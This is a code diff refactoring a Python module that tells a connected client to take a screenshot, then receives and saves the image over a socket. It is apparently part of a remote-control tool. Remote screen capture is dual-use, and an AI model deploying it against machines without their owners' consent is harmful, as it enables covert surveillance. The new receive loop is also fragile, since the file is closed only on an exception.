@@ -1,5 +1,5 @@
 from Server import Server
-
+from PIL import Image
 
 class Screenshot:
     """
@@ -7,7 +7,7 @@ class Screenshot:
     This class handles the modular functionality of downloading a screenshot taken by the client.
     """
 
-    def __init__(self, currentSession, local_file):
+    def __init__(self, connection, local_path):
         """
         Initializes the Submodule with a name and description.
         """
@@ -15,29 +15,29 @@ class Screenshot:
         self.name = "Screenshot"
         self.description = "This module handles the process of downloading a screenshot taken by the client."
 
-        self._currentSession = currentSession
-        self._local_file = local_file
+        self._connection = connection
+        self._local_path = local_path
 
-    def askForScreenshot(self, server, client):
+    def askForScreenshot(self):
         """
         Ask the client to take the screenshot
         """
+        self._connection.send(b'screenshot')
 
-        server.sendTo(client, b'screenshot')
-
-    def saveScreenshot(self, server, client, file):
+    def saveScreenshot(self, path):
         """
         Receives the file contents from the socket and writes it into the local file
         """
 
-        data = server.recvFrom(client)
-
-        # write the image data to a file
-        with open(file, 'wb') as f:
-            f.write(data)
-
-        f.close()
-
+        file = open(path, 'wb')
+        chunk = self._connection.recv(1024)
+        while chunk:
+            try:
+                file.write(chunk)
+                chunk = self._connection.recv(1024)
+            except:
+                file.close()
+                return True
 
     def execute(self):
         """
@@ -45,13 +45,15 @@ class Screenshot:
         """
 
         print(f"Executing Submodule {self.name} - {self.description}")
-        server = Server.getInstance()
 
         # Ask the client to deliver the specified file
-        self.askForScreenshot(server, self._currentSession - 1)
+        self.askForScreenshot()
 
         # Gets the file contents and saves it in the local path
-        self.saveScreenshot(server, self._currentSession - 1, self._local_file)
+        self.saveScreenshot(self._local_path)
 
-        return f"Done! Screenshot taken and saved to {self._local_file}"
+        # Open the image for UX
+        Image.open(self._local_path).show()
+
+        return f"Done! Screenshot taken and saved to {self._local_path}"
 
